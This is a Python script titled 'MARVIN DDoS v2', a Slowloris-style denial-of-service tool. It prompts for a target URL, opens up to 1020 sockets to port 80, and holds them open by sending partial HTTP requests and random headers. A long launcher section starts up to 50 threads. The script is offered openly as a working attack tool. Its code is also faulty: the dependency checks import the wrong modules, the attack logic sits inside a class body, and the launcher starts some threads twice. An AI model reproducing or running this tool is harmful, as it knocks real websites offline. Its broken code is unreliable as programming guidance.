import os

# -------------------------------------------- 

try:
  import Colorama
except:
  print("Installing Dependency: Colorama")
  os.system("pip3.9 install colorama 1>/dev/null")

try:
  import time
except:
  print("Installing Dependency: Time")
  os.system("pip3.9 install time 1>/dev/null")

try:
  import time
except:
  print("Installing Dependency: Signal")
  os.system("pip3.9 install signal 1>/dev/null")

try:
  import time
except:
  print("Installing Dependency: Readchar")
  os.system("pip3.9 install readchar 1>/dev/null")

# --------------------------------------------
import threading
import time
import colorama
from colorama import Fore
import random
import socket
import sys

# --------------------------------------------

class attacker:
    sockets = []
    def setupSocket(ip):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((ip, 80))
        sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))
        headers = [
        "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Accept-language: en-US,en"
        ]   
        for header in headers:
            sock.send("{}\r\n".format(header).encode("utf-8"))

        return sock

    if __name__ == "__main__":
        if len(sys.argv) != 2:
            print(Fore.RED+"Unknown Error"+Fore.WHITE)
            sys.exit()

        ip = sys.argv[1]
        count = 1020

        for _ in range(count):
            try:
                print(Fore.YELLOW+"Connecting Sockets {}".format(_))
                sock = setupSocket(ip)
            except socket.error:
                break

            sockets.append(sock)

        while True:
            print(Fore.GREEN+"Connected {} sockets".format(len(sockets)))

            for sock in list(sockets):
                try:
                    sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
                except socket.error:
                    sockets.remove(sock)

            for _ in range(count - len(sockets)):
                try:
                    sock = setupSocket(ip)
                    if sock:
                        print(Fore.RED+"HIT!"+Fore.WHITE)
                        sockets.append(sock)
                except socket.error:
                    break

# --------------------------------------------

os.system("clear")

time.sleep(1)

logo = """
  ███╗   ███╗ █████╗ ██████╗ ██╗   ██╗██╗███╗   ██╗
  ████╗ ████║██╔══██╗██╔══██╗██║   ██║██║████╗  ██║
  ██╔████╔██║███████║██████╔╝██║   ██║██║██╔██╗ ██║
  ██║╚██╔╝██║██╔══██║██╔══██╗╚██╗ ██╔╝██║██║╚██╗██║
  ██║ ╚═╝ ██║██║  ██║██║  ██║ ╚████╔╝ ██║██║ ╚████║
  ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚═╝  ╚═══╝
  DDoS v2                                               
"""

print(Fore.RED + logo + Fore.BLUE)

ip = input(Fore.CYAN+"  URL: "+Fore.WHITE)

count = input(Fore.CYAN+"  Multiplier(1-50): "+Fore.WHITE)

def attack():
  print("  Starting Thread!")
  os.system("python3.9 attacker.py "+ip)
  print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")

yesno = input(Fore.RED+"  Start Attack On "+ip+" With "+count+"x Multiplier"+"? Y/N: ")

if yesno == "n":
  print(Fore.BLUE+"  Exiting...")
  time.sleep(2)
  os.system("clear")
  exit()

if yesno == "N":
  print(Fore.BLUE+"  Exiting...")
  time.sleep(2)
  os.system("clear")
  exit()

if __name__ == "__main__":
  t1 = threading.Thread(target=attacker)
  t2 = threading.Thread(target=attacker)
  t3 = threading.Thread(target=attacker)
  t4 = threading.Thread(target=attacker)
  t5 = threading.Thread(target=attacker)
  t6 = threading.Thread(target=attacker)
  t7 = threading.Thread(target=attacker)
  t8 = threading.Thread(target=attacker)
  t9 = threading.Thread(target=attacker)
  t10 = threading.Thread(target=attacker)
  t11 = threading.Thread(target=attacker)
  t12 = threading.Thread(target=attacker)
  t13 = threading.Thread(target=attacker)
  t14 = threading.Thread(target=attacker)
  t15 = threading.Thread(target=attacker)
  t16 = threading.Thread(target=attacker)
  t17 = threading.Thread(target=attacker)
  t18 = threading.Thread(target=attacker)
  t19 = threading.Thread(target=attacker)
  t20 = threading.Thread(target=attacker)
  t21 = threading.Thread(target=attacker)
  t22 = threading.Thread(target=attacker)
  t23 = threading.Thread(target=attacker)
  t24 = threading.Thread(target=attacker)
  t25 = threading.Thread(target=attacker)
  t26 = threading.Thread(target=attacker)
  t27 = threading.Thread(target=attacker)
  t28 = threading.Thread(target=attacker)
  t29 = threading.Thread(target=attacker)
  t30 = threading.Thread(target=attacker)
  t31 = threading.Thread(target=attacker)
  t32 = threading.Thread(target=attacker)
  t33 = threading.Thread(target=attacker)
  t34 = threading.Thread(target=attacker)
  t35 = threading.Thread(target=attacker)
  t36 = threading.Thread(target=attacker)
  t37 = threading.Thread(target=attacker)
  t38 = threading.Thread(target=attacker)
  t39 = threading.Thread(target=attacker)
  t40 = threading.Thread(target=attacker)
  t41 = threading.Thread(target=attacker)
  t42 = threading.Thread(target=attacker)
  t43 = threading.Thread(target=attacker)
  t44 = threading.Thread(target=attacker)
  t45 = threading.Thread(target=attacker)
  t46 = threading.Thread(target=attacker)
  t47 = threading.Thread(target=attacker)
  t48 = threading.Thread(target=attacker)
  t49 = threading.Thread(target=attacker)
  t50 = threading.Thread(target=attacker)
if count == "1":
  t1.start()
if count == "2":
  t1.start()
  t2.start()
if count == '3':
  t1.start()
  t2.start()
  t3.start()
if count == '4':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
if count == '5':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
if count == '6':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
if count == '7':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
if count == '8':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
if count == '9':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
if count == '10':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
if count == '11':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
if count == '12':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
if count == '13':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
if count == '14':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
if count == '15':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
if count == '16':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
if count == '17':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
if count == '18':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
if count == '19':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
if count == '20':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
if count == '21':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
if count == '22':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
if count == '23':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
if count == '24':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
if count == '25':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
if count == '26':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
if count == '27':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
if count == '28':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
if count == '29':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
if count == '30':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
if count == '31':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
if count == '32':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
if count == '33':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
if count == '34':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
if count == '35':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
if count == '36':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
if count == '37':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
if count == '38':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
if count == '39':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
if count == '40':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
if count == '41':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
if count == '42':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
if count == '43':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
if count == '44':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
  t44.start()
if count == '45':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
  t44.start()
  t45.start()
if count == '46':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
  t44.start()
  t45.start()
  t46.start()
if count == '47':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
  t44.start()
  t45.start()
  t46.start()
  t47.start()
if count == '48':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
  t44.start()
  t45.start()
  t46.start()
  t47.start()
  t48.start()
if count == '49':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
  t44.start()
  t45.start()
  t46.start()
  t47.start()
  t48.start()
  t49.start()
if count == '50':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
  t44.start()
  t45.start()
  t46.start()
  t47.start()
  t48.start()
  t49.start()
  t50.start()
